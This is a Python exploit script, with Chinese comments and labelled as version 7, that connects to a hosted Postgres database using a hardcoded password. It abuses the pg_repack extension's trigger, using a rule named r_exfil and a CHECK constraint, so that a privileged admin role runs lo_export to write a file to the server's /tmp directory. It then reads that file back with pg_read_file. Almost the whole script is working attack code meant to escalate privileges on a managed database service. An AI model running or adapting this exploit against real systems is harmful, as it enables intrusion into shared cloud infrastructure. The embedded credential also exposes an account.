# -*- coding: utf-8 -*-
"""v7:void 函数载体调试——CHECK 约束执行 lo_export(写文件证明)
CHECK (lo_export(...) IS NULL):INSERT log 时 cloud_admin 求值"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:300]

q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("CREATE TABLE k_src(id int)", fetch=False)
q("CREATE TABLE k_out(x text)", fetch=False)

# 1) 建大对象(lo_from_bytea 返回 oid,可作 SELECT 列)
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src, ck bool DEFAULT true)" % (oid, oid), fetch=False)
q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False)

# RULE:lo_from_bytea 创建含内容的大对象
q("DROP RULE IF EXISTS r_exfil ON repack.log_%d" % oid, fetch=False)
r = q("CREATE RULE r_exfil AS ON INSERT TO repack.log_%d DO ALSO INSERT INTO k_out(x) SELECT lo_from_bytea(0, convert_to('K_FILE_WRITE_PROOF_v7','UTF8'))::text" % oid, fetch=False)
print('[1] rule lo_from_bytea:', r)
r = q("INSERT INTO k_src VALUES (1)", fetch=False)
print('[1] fire:', r)
rows = q("SELECT x FROM k_out")
print('[1] loid:', rows)
loid = int(rows[0][0]) if rows else None

if loid:
    # 2) CHECK 载体执行 lo_export(写 /tmp)
    # CHECK 约束在 INSERT log 时求值——把 log 表加 CHECK
    q("ALTER TABLE repack.log_%d DROP CONSTRAINT IF EXISTS ck_exp" % oid, fetch=False)
    r = q("ALTER TABLE repack.log_%d ADD CONSTRAINT ck_exp CHECK (lo_export(%d, '/tmp/k_proof_v7.txt') IS NULL)" % (oid, loid), fetch=False)
    print('[2] add CHECK lo_export:', r)
    q("TRUNCATE k_out", fetch=False)
    r = q("INSERT INTO k_src VALUES (2)", fetch=False)
    print('[2] fire:', r)
    # 3) 验证文件
    q("DROP RULE IF EXISTS r_exfil ON repack.log_%d" % oid, fetch=False)
    q("ALTER TABLE repack.log_%d DROP CONSTRAINT IF EXISTS ck_exp" % oid, fetch=False)
    r = q("CREATE RULE r_exfil AS ON INSERT TO repack.log_%d DO ALSO INSERT INTO k_out(x) SELECT pg_read_file('/tmp/k_proof_v7.txt')" % oid, fetch=False)
    q("TRUNCATE k_out", fetch=False)
    r2 = q("INSERT INTO k_src VALUES (3)", fetch=False)
    rows = q("SELECT x FROM k_out")
    print('[3] readback /tmp/k_proof_v7.txt:', rows)
    # 大对象清理
    q("SELECT lo_unlink(%d)" % loid, fetch=False)
    print('[4] lo_unlink done')

# 清理
q("DROP RULE IF EXISTS r_exfil ON repack.log_%d" % oid, fetch=False)
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
print('[final]:', q("SELECT tablename FROM pg_tables WHERE schemaname IN ('public','repack')"))
conn.close()
